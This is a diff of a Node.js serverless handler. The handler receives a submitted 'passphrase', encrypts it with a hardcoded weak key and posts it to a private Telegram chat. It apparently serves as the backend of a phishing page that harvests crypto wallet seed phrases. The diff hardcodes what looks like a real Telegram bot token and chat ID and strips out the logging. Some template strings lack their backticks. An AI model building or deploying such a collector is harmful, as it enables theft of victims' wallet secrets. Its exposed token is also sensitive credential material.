@@ -2,9 +2,9 @@ const axios = require('axios');
 const crypto = require('crypto');
 
 // Telegram bot token and chat ID
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Use environment variable
-const YOUR_CHAT_ID = process.env.YOUR_CHAT_ID; // Use environment variable
-const SECRET_KEY = process.env.SECRET_KEY; // Use environment variable
+const TELEGRAM_BOT_TOKEN = '7248582544:AAENmLU6BtzXP__js6HxZuJxuv9oFn4qFcM'; // Replace with your bot token
+const YOUR_CHAT_ID = '1779564295'; // Replace with your chat ID
+const SECRET_KEY = 'Dontfall'; // Replace with a secure key for encryption
 
 // Encrypt the passphrase
 function encryptPassphrase(passphrase) {
@@ -15,7 +15,6 @@ function encryptPassphrase(passphrase) {
 }
 
 module.exports = async (req, res) => {
-    console.log("Request received:", req.method, req.body); // Log the request
     if (req.method === 'POST') {
         const { passphrase } = req.body;
 
@@ -26,18 +25,16 @@ module.exports = async (req, res) => {
         try {
             // Encrypt the passphrase
             const encryptedPassphrase = encryptPassphrase(passphrase);
-            console.log("Encrypted passphrase:", encryptedPassphrase); // Log the encrypted passphrase
 
             // Send to your Telegram account
-            const telegramResponse = await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
+            await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
                 chat_id: YOUR_CHAT_ID,
                 text: Encrypted Passphrase: ${encryptedPassphrase},
             });
-            console.log("Telegram response:", telegramResponse.data); // Log the Telegram response
 
             res.status(200).json({ success: true });
         } catch (error) {
-            console.error("Error:", error.response ? error.response.data : error.message); // Log the error
+            console.error(error);
             res.status(500).json({ error: 'Failed to send passphrase to Telegram' });
         }
     } else {
